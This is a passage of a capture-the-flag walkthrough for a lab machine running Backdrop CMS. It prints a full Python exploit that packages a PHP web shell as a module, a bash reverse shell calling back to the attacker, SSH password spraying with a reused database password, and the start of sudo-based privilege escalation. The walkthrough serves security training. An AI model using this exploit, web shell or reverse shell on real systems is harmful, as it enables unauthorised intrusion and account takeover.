</span></span><span class="line"><span class="cl"><span class="c1"># Software Link: https://github.com/backdrop/backdrop/releases/download/1.27.1/backdrop.zip</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Version: latest</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Tested on: MacOS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zipfile</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_files</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">info_content</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    type = module
</span></span></span><span class="line"><span class="cl"><span class="s2">    name = Block
</span></span></span><span class="line"><span class="cl"><span class="s2">    description = Controls the visual building blocks a page is constructed
</span></span></span><span class="line"><span class="cl"><span class="s2">    with. Blocks are boxes of content rendered into an area, or region, of a
</span></span></span><span class="line"><span class="cl"><span class="s2">    web page.
</span></span></span><span class="line"><span class="cl"><span class="s2">    package = Layouts
</span></span></span><span class="line"><span class="cl"><span class="s2">    tags[] = Blocks
</span></span></span><span class="line"><span class="cl"><span class="s2">    tags[] = Site Architecture
</span></span></span><span class="line"><span class="cl"><span class="s2">    version = BACKDROP_VERSION
</span></span></span><span class="line"><span class="cl"><span class="s2">    backdrop = 1.x
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    configure = admin/structure/block
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">    ; Added by Backdrop CMS packaging script on 2024-03-07
</span></span></span><span class="line"><span class="cl"><span class="s2">    project = backdrop
</span></span></span><span class="line"><span class="cl"><span class="s2">    version = 1.27.1
</span></span></span><span class="line"><span class="cl"><span class="s2">    timestamp = 1709862662
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">shell_info_path</span> <span class="o">=</span> <span class="s2">&#34;shell/shell.info&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">shell_info_path</span><span class="p">),</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  <span class="c1"># Klasörüoluşturur</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shell_info_path</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">info_content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">shell_content</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;html&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;form method=&#34;GET&#34; name=&#34;&lt;?php echo basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;input type=&#34;TEXT&#34; name=&#34;cmd&#34; autofocus id=&#34;cmd&#34; size=&#34;80&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;input type=&#34;SUBMIT&#34; value=&#34;Execute&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/form&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;pre&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;?php
</span></span></span><span class="line"><span class="cl"><span class="s2">    if(isset($_GET[&#39;cmd&#39;]))
</span></span></span><span class="line"><span class="cl"><span class="s2">    {
</span></span></span><span class="line"><span class="cl"><span class="s2">    system($_GET[&#39;cmd&#39;]);
</span></span></span><span class="line"><span class="cl"><span class="s2">    }
</span></span></span><span class="line"><span class="cl"><span class="s2">    ?&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/pre&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/html&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">shell_php_path</span> <span class="o">=</span> <span class="s2">&#34;shell/shell.php&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shell_php_path</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shell_content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">shell_info_path</span><span class="p">,</span> <span class="n">shell_php_path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_zip</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">zip_filename</span> <span class="o">=</span> <span class="s2">&#34;shell.zip&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="n">zip_filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">zipf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">arcname</span><span class="o">=</span><span class="s1">&#39;shell/shell.info&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">zipf</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">php_path</span><span class="p">,</span> <span class="n">arcname</span><span class="o">=</span><span class="s1">&#39;shell/shell.php&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">zip_filename</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Backdrop CMS 1.27.1 - Remote Command Execution Exploit&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Evil module generating...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span> <span class="o">=</span> <span class="n">create_files</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">zip_filename</span> <span class="o">=</span> <span class="n">create_zip</span><span class="p">(</span><span class="n">info_path</span><span class="p">,</span> <span class="n">php_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Evil module generated!&#34;</span><span class="p">,</span> <span class="n">zip_filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Go to &#34;</span> <span class="o">+</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/admin/modules/install and upload the &#34;</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">          <span class="n">zip_filename</span> <span class="o">+</span> <span class="s2">&#34; for Manual Installation.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Your shell address:&#34;</span><span class="p">,</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/modules/shell/shell.php&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Usage: python script.py [url]&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            
</span></span></code></pre></div><h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
<p>Running the Python script:
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">./exploit.py</span> http://10.10.11.58/
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58//admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58//modules/shell/shell.php

</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<p>The script instructs us to upload <code>shell.zip</code> via the <strong>&ldquo;Manual Installation&rdquo;</strong> option in the CMS admin panel (<code>http://dog.htb/admin/modules/install</code>).</p>
<p><code>Functionality &gt; Install new modules &gt; Manual Installation</code></p>
<p><img alt="Step 1" loading="lazy" src="/img/dog/step1.png">
<img alt="Step 2" loading="lazy" src="/img/dog/step2.png"></p>
<p><img alt="Step 3" loading="lazy" src="/img/dog/step3.png"></p>
<p>However, the CMS only accepts <code>.tar.gz</code> files for manual installation. We need to compress the <code>shell/</code> directory generated by the script into a <code>.tar.gz</code> archive.</p>
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">tar</span> <span class="flag">-czf</span> shell.tar.gz <span style="font-weight: bold;">shell/</span>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ls</span>
<span style="color:#2a3ff8;font-weight: bold">shell</span>  <span style="color:#ec0101;font-weight: bold">shell.tar.gz  shell.zip</span>  exploit.py  <span style="color:#2a3ff8;font-weight: bold">git-dump</span>
</code><button class="copy-code">copy</button></pre>
  </div>
</div>

<p>Now, we can upload <code>shell.tar.gz</code> through the <strong>&ldquo;Manual installation&rdquo;</strong> page.</p>
<p><img alt="Installed" loading="lazy" src="/img/dog/installed.png"></p>
<p>After successful installation, we can access our web shell at <code>http://dog.htb/modules/shell/shell.php</code></p>
<p><img alt="Shell" loading="lazy" src="/img/dog/shell.png"></p>
<p>The web shell confirms we are running as the <code>www-data</code> user. We&rsquo;ll use a reverse shell to get a more stable connection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/&lt;YOUR IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&#39;</span>
</span></span></code></pre></div><p>On our attacking machine, we set up a <code>netcat</code> listener:
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nc</span> <span class="flag">-lnvp</span> 9001
listening on [any] 9001 ...
connect to [10.10.15.7] from (UNKNOWN) [10.10.11.58] 54688
bash: cannot set terminal process group (929): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dog:/var/www/html/modules/shell$ 

</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<p>We upgrade the shell to an interactive TTY:
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
www-data@dog:/var/www/html/modules/shell$ script <span class="flag">-q</span> /dev/null <span class="flag">-c</span> bash
</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<p>Then, <code>CTRL+Z</code> to background the shell, followed by <code>stty raw -echo; fg</code> and pressing <code>Enter</code> twice.
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
stty raw <span class="flag">-echo</span>; fg
[2]  - continued  nc <span class="flag">-lnvp</span> 9001

www-data@dog:/var/www/html/modules/shell$
</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<p>We also adjust the TTY dimensions for better usability:</p>
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">stty</span> <span class="flag">-a</span>
speed 38400 baud; rows 45; columns 238; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
<span class="flag">-parenb</span> <span class="flag">-parodd</span> <span class="flag">-cmspar</span> cs8 <span class="flag">-hupcl</span> <span class="flag">-cstopb</span> cread <span class="flag">-clocal</span> <span class="flag">-crtscts</span>
<span class="flag">-ignbrk</span> <span class="flag">-brkint</span> <span class="flag">-ignpar</span> <span class="flag">-parmrk</span> <span class="flag">-inpck</span> <span class="flag">-istrip</span> <span class="flag">-inlcr</span> <span class="flag">-igncr</span> icrnl ixon <span class="flag">-ixoff</span> <span class="flag">-iuclc</span> <span class="flag">-ixany</span> <span class="flag">-imaxbel</span> iutf8
opost <span class="flag">-olcuc</span> <span class="flag">-ocrnl</span> onlcr <span class="flag">-onocr</span> <span class="flag">-onlret</span> <span class="flag">-ofill</span> <span class="flag">-ofdel</span> nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok <span class="flag">-echonl</span> <span class="flag">-noflsh</span> <span class="flag">-xcase</span> <span class="flag">-tostop</span> <span class="flag">-echoprt</span> echoctl echoke <span class="flag">-flusho</span> <span class="flag">-extproc</span>

</code><button class="copy-code">copy</button></pre>
  </div>
</div>

<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
www-data@dog:/var/www/html/modules/shell$ stty rows 45 cols 238
</code><button class="copy-code">copy</button></pre>
  </div>
</div>


<style>
  .callout {
    display: flex;
    padding: 1rem;
    margin: 1.5rem 0;
    border-left: 5px solid;
    border-radius: 0.5rem;
    background-color: var(--code-bg); 
  }

  .callout-icon {
    flex-shrink: 0;
    margin-right: 1rem;
    width: 1.5em; 
    height: 1.5em;
  }

  .callout-content {
    flex-grow: 1;
    font-size: 0.95em;
    line-height: 1.6;
  }

  .callout-content > *:first-child {
    margin-top: 0;
  }
  .callout-content > *:last-child {
    margin-bottom: 0;
  }


  .callout.callout-default {
    border-color: #4a90e2; 
    background-color: rgba(74, 144, 226, 0.1);
  }
  .callout.callout-default .callout-icon {
    color: #4a90e2;
  }

  .callout.callout-info {
    border-color: #50e3c2; 
    background-color: rgba(80, 227, 194, 0.1);
  }
  .callout.callout-info .callout-icon {
    color: #50e3c2;
  }

  .callout.callout-warning {
    border-color: #f5a623; 
    background-color: rgba(245, 166, 35, 0.1);
  }
  .callout.callout-warning .callout-icon {
    color: #f5a623;
  }

  .callout.callout-error {
    border-color: #d0021b; 
    background-color: rgba(208, 2, 27, 0.1);
  }
  .callout.callout-error .callout-icon {
    color: #d0021b;
  }
</style><div class="callout callout-warning">
  <div class="callout-icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
  </div>
  <div class="callout-content">
    
    Actually, you don&rsquo;t need to do this step since you can just find a user through the webshell.
  </div>
</div>

<p>Now that we have a stable shell, we enumerate local users on the system.
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash

</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<p>We found three users with shell access: <code>root</code>, <code>jobert</code>, and <code>johncusack</code>. We&rsquo;ll save these usernames to <code>users.txt</code>.</p>
<p>We use <code>netexec</code> to spray the database password (<code>BackDropJ2024DS2024</code>) against these users for SSH.
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> ssh 10.10.11.58 <span class="flag">-u</span> <span style="font-weight: bold;">users.txt</span> <span class="flag">-p</span> <span class="string">'BackDropJ2024DS2024'</span> <span class="flag">--continue-on-success</span>
<span class="ssh">SSH</span>         10.10.11.58     22     10.10.11.58      <span class="indicator-info">[*]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12
<span class="ssh">SSH</span>         10.10.11.58     22     10.10.11.58      <span class="indicator-error">[-]</span> jobert:BackDropJ2024DS2024
<span class="ssh">SSH</span>         10.10.11.58     22     10.10.11.58      <span class="indicator-success">[+]</span> johncusack:BackDropJ2024DS2024  Linux - Shell access!
</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<p>The <code>johncusack</code> user&rsquo;s password is <code>BackDropJ2024DS2024</code>. We can now SSH into the box as <code>johncusack</code>.</p>
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span class="prompt-host">root@0xblivion</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ssh</span> johncusack@dog.htb
The authenticity of host <span class="string">'dog.htb (10.10.11.58)'</span> can't be established.
ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:6: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added <span class="string">'dog.htb'</span> (ED25519) to the list of known hosts.
johncusack@dog.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 02 Jul 2025 09:26:21 PM UTC

  System load:           0.0
  Usage of /:            50.9% of 6.32GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             244
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.58
  IPv6 address for eth0: dead:beef::250:56ff:feb0:b9d2


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Tue Mar 4 17:04:29 2025 from 10.10.15.7
<span style="color:#87d61f;; font-weight: bold;">johncusack@dog</span><span style="color:white">:</span><span style="color: #3b4df1">~<span><span style="color: white">$</span>

</code><button class="copy-code">copy</button></pre>
  </div>
</div>

<p>We are now logged in as <code>johncusack</code>. We can find the user flag in the home directory.
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span style="color:#87d61f;; font-weight: bold;">johncusack@dog</span><span style="color:white">:</span><span style="color: #3b4df1">~</span><span style="color: white">$</span> ls
user.txt
<span style="color:#87d61f;; font-weight: bold;">johncusack@dog</span><span style="color:white">:</span><span style="color: #3b4df1">~</span><span style="color: white">$</span> cat user.txt 
d305454bc5a53fb01aec080ec3a2ee33
</code><button class="copy-code">copy</button></pre>
  </div>
</div>
</p>
<blockquote>
<p>User flag: d305454bc5a53fb01aec080ec3a2ee33</p></blockquote>
<hr>
<h1 id="4-privilege-escalation-to-root">4. Privilege Escalation to Root<a hidden class="anchor" aria-hidden="true" href="#4-privilege-escalation-to-root">#</a></h1>
<p>We check <code>sudo -l</code> to see what commands <code>johncusack</code> can run with <code>sudo</code> privileges.</p>
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span style="color:#87d61f;; font-weight: bold;">johncusack@dog</span><span style="color:white">:</span><span style="color: #3b4df1">~</span><span style="color: white">$</span> sudo <span class="flag">-l</span>
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
</code><button class="copy-code">copy</button></pre>
  </div>
</div>

<p>The user <code>johncusack</code> can execute <code>/usr/local/bin/bee</code> as root. We inspect the <code>bee</code> file.</p>
<div class="terminal-linux">
  <div class="terminal-header">
    <div class="window-controls">
      <span class="dot red"></span>
      <span class="dot yellow"></span>
      <span class="dot green"></span>
    </div>
    <div class="terminal-title">0xblivion@fluffy: ~</div>
  </div>
  <div class="terminal-content">
    <pre><code>
<span style="color:#87d61f;; font-weight: bold;">johncusack@dog</span><span style="color:white">:</span><span style="color: #3b4df1">~</span><span style="color: white">$</span> file /usr/local/bin/bee
/usr/local/bin/bee: symbolic link to /backdrop_tool/bee/bee.php
</code><button class="copy-code">copy</button></pre>
  </div>
</div>

<p>It&rsquo;s a symbolic link to <code>/backdrop_tool/bee/bee.php</code>. We can view the contents of <code>bee.php</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @file
</span></span></span><span class="line"><span class="cl"><span class="sd"> * A command line utility for Backdrop CMS.
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Exit gracefully with a meaningful message if installed within a web
</span></span></span><span class="line"><span class="cl"><span class="c1">// accessible location and accessed in the browser.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">bee_is_cli</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">echo</span> <span class="nx">bee_browser_load_html</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Set custom error handler.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">set_error_handler</span><span class="p">(</span><span class="s1">&#39;bee_error_handler&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Include files.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">require_once</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/includes/miscellaneous.inc&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/includes/command.inc&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/includes/render.inc&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/includes/filesystem.inc&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/includes/input.inc&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/includes/globals.inc&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Main execution code.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">bee_initialize_server</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">bee_parse_input</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">bee_initialize_console</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">bee_process_command</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">bee_print_messages</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">bee_display_output</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Custom error handler for `bee`.
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param int $error_level
</span></span></span><span class="line"><span class="cl"><span class="sd"> *   The level of the error.
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param string $message
